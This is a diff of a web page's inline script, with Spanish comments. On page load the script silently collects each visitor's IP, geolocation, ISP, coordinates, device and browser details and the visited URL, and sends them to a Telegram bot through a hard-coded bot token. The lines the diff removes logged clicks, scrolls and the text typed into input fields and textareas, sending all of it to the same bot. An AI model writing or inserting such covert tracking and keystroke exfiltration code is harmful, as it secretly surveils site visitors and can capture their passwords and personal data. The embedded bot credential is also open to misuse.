@@ -67,7 +67,7 @@
 <body>
 
    <script>
-       window.onload = function() {
+     window.onload = function() {
     const telegramUrl = "https://api.telegram.org/bot7815776748:AAGl2LfwdET9KRExkGVyYzGfUiXDcqEwUBY/sendMessage";
     const chatId = "5895952454"; // Tu ID de chat real
 
@@ -83,10 +83,24 @@
             const region = data.region;
             const country = data.country_name;
             const isp = data.org;
-            
-            // Crear el mensaje con toda la información
-            const message = `🚀 ¡Nueva visita en tu página web!\n\n🌍 IP: ${ip}\n📍 Ubicación: ${city}, ${region}, ${country}\n🏢 Proveedor: ${isp}\n🖥️ Dispositivo: ${userAgent}`;
-            
+            const lat = data.latitude || 'Desconocido';
+            const lon = data.longitude || 'Desconocido';
+
+            // Obtener si el usuario está usando un dispositivo móvil o de escritorio
+            const deviceType = /mobile/i.test(userAgent) ? "Móvil" : "Escritorio";
+
+            // Crear el mensaje con más detalles del usuario
+            const message = `🚀 **Nueva visita a tu página web!**
+
+👤 **IP del usuario**: \`${ip}\`
+📍 **Ubicación**: \`${city}, ${region}, ${country}\`
+🌐 **Proveedor**: \`${isp}\`
+🖥️ **Dispositivo**: \`${userAgent.split(" ")[0]}\`
+📱 **Tipo de dispositivo**: \`${deviceType}\`
+📍 **Coordenadas**: \`Lat: ${lat} | Lon: ${lon}\`
+🔗 **URL visitada**: \`${window.location.href}\`
+`;
+
             // Enviar la notificación a Telegram
             fetch(`${telegramUrl}?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                 .then(response => response.json())
@@ -101,64 +115,22 @@
         })
         .catch(error => console.error("❌ Error al obtener la IP:", error));
 
-    // Detectar clics en cualquier parte de la página
-    document.addEventListener("click", function(event) {
-        const clickedElement = event.target;
-        const clickedElementInfo = `Elemento clickeado: ${clickedElement.tagName}, ${clickedElement.id || clickedElement.className}`;
+    // Detectar la URL de la página y otros eventos importantes
+    const pageDetails = `📍 **Visitante en**: ${window.location.href}
+🖥️ **Navegador**: ${navigator.appName} / ${navigator.appVersion}
+💻 **Sistema Operativo**: ${navigator.platform}`;
 
-        // Crear mensaje para el clic
-        const clickMessage = `📱 ¡El usuario hizo clic en algo!\n${clickedElementInfo}\n\nURL actual: ${window.location.href}`;
-
-        // Enviar mensaje al bot
-        fetch(`${telegramUrl}?chat_id=${chatId}&text=${encodeURIComponent(clickMessage)}`)
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    console.log("✅ Mensaje de clic enviado con éxito.");
-                } else {
-                    console.error("❌ Error al enviar el mensaje de clic:", data);
-                }
-            })
-            .catch(error => console.error("❌ Error de red:", error));
-    });
-
-    // Detectar cuando el usuario escribe en un campo de texto (input)
-    document.addEventListener("input", function(event) {
-        if (event.target.tagName === "INPUT" || event.target.tagName === "TEXTAREA") {
-            const inputText = event.target.value;
-            const inputMessage = `✍️ El usuario está escribiendo en un campo.\nCampo: ${event.target.tagName} \nTexto: ${inputText}\n\nURL actual: ${window.location.href}`;
-
-            // Enviar mensaje al bot
-            fetch(`${telegramUrl}?chat_id=${chatId}&text=${encodeURIComponent(inputMessage)}`)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        console.log("✅ Mensaje de escritura enviado con éxito.");
-                    } else {
-                        console.error("❌ Error al enviar el mensaje de escritura:", data);
-                    }
-                })
-                .catch(error => console.error("❌ Error de red:", error));
-        }
-    });
-
-    // Detectar desplazamiento (scroll) en la página
-    document.addEventListener("scroll", function() {
-        const scrollPosition = window.scrollY;
-        const scrollMessage = `📍 ¡El usuario ha desplazado la página!\nPosición de desplazamiento: ${scrollPosition}\n\nURL actual: ${window.location.href}`;
-
-        // Enviar mensaje al bot
-        fetch(`${telegramUrl}?chat_id=${chatId}&text=${encodeURIComponent(scrollMessage)}`)
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    console.log("✅ Mensaje de desplazamiento enviado con éxito.");
-                } else {
-                    console.error("❌ Error al enviar el mensaje de desplazamiento:", data);
-                }
-            })
-            .catch(error => console.error("❌ Error de red:", error));
-    });
+    // Enviar detalles adicionales sobre la página y navegador
+    fetch(`${telegramUrl}?chat_id=${chatId}&text=${encodeURIComponent(pageDetails)}`)
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                console.log("✅ Detalles de la página enviados.");
+            } else {
+                console.error("❌ Error al enviar los detalles de la página:", data);
+            }
+        })
+        .catch(error => console.error("❌ Error de red:", error));
 };
 
     </script>
